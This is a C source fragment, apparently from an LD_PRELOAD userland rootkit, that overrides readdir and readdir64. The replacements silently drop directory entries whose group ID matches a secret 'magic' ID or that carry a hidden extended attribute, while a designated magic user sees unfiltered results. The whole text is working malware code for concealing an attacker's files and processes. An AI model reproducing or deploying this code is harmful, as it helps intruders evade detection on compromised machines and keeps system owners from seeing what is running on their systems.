struct dirent *readdir(DIR *dirp){
    hook(CREADDIR);

    if(!initmvbc() || magicusr())
        return call(CREADDIR, dirp);
    int df = dirfd(dirp);

    struct dirent *dir;
    while((dir = call(CREADDIR, dirp)) != NULL){
        if(parent_or_current_dir(dir->d_name) || strcmp("/\0", dir->d_name) == 0)
            break;

        ssize_t dlen;
        char *dirname = gdirname(df, &dlen);
        if(!dirname) break;
        const size_t pathlen = dlen + strlen(dir->d_name) + 2;
        if(pathlen > PATH_MAX){
            clean(dirname);
            break;
        }
        char path[pathlen];
        snprintf(path, pathlen, "%s/%s", dirname, dir->d_name);
        clean(dirname);

#ifdef USE_MAGIC_ATTR
        int isproc = isaproc(path);
        if(!isproc && hidden_xattr(path, mvbc->magicattr))
            continue;
        else if(isproc && get_path_gid(path) == mvbc->magicid)
            continue;
#else
        if(get_path_gid(path) == mvbc->magicid)
            continue;
#endif
        break;
    }

    return dir;
}

struct dirent64 *readdir64(DIR *dirp){
    hook(CREADDIR64);

    if(!initmvbc() || magicusr())
        return call(CREADDIR64, dirp);
    int df = dirfd(dirp);

    struct dirent64 *dir;
    while((dir = call(CREADDIR64, dirp)) != NULL){
        if(parent_or_current_dir(dir->d_name) || strcmp("/\0", dir->d_name) == 0)
            break;

        ssize_t dlen;
        char *dirname = gdirname(df, &dlen);
        if(!dirname) break;
        const size_t pathlen = dlen + strlen(dir->d_name) + 2;
        if(pathlen > PATH_MAX){
            clean(dirname);
            break;
        }
        char path[pathlen];
        snprintf(path, pathlen, "%s/%s", dirname, dir->d_name);
        clean(dirname);

#ifdef USE_MAGIC_ATTR
        int isproc = isaproc(path);
        if(!isproc && hidden_xattr(path, mvbc->magicattr))
            continue;
        else if(isproc && get_path_gid(path) == mvbc->magicid)
            continue;
#else
        if(get_path_gid(path) == mvbc->magicid)
            continue;
#endif
        break;
    }

    return dir;
}